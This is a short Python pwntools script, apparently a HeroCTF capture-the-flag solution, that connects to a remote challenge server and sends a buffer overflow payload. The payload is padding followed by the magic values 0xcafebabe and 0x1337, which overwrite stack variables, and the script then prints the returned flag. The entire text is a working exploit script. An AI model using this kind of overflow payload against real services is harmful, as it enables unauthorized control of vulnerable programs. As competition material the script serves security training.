import pwn

#proc = pwn.process("SANTA.bin")
proc = pwn.remote("pwn.heroctf.fr", 9000)
payload = b"\x00" + b"A"*63 + pwn.pack(0xcafebabe, 32) + pwn.pack(0x1337, 32)[:-1]
proc.recvuntil("\n\n")
proc.sendline(payload)
proc.recvuntil(" : ")
print(proc.recvuntil('}\n').replace(b"\n", b""))
